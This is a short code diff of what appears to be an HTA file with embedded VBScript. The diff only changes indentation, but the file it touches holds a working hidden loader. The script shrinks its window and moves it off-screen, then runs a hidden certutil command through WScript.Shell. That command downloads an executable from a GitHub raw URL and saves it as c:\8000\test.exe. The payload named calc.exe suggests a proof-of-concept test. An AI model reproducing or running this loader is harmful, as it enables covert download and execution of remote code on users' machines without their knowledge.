@@ -6,11 +6,9 @@
 	window.resizeTo 0,0   
 	window.MoveTo -100,-100   
 	const impersonation = 3
-    const HIDDEN_WINDOW = 12
-    Set Locator = CreateObject("WScript.Shell")
-	
+        const HIDDEN_WINDOW = 12
+        Set Locator = CreateObject("WScript.Shell")
 	Locator.Run"certutil -urlcache -split -f https://raw.githubusercontent.com/cheungwu/testCC/master/calc.exe c:\8000\test.exe;",0,FALSE
-	
 	 window.close() 
 	end sub 
  </script>
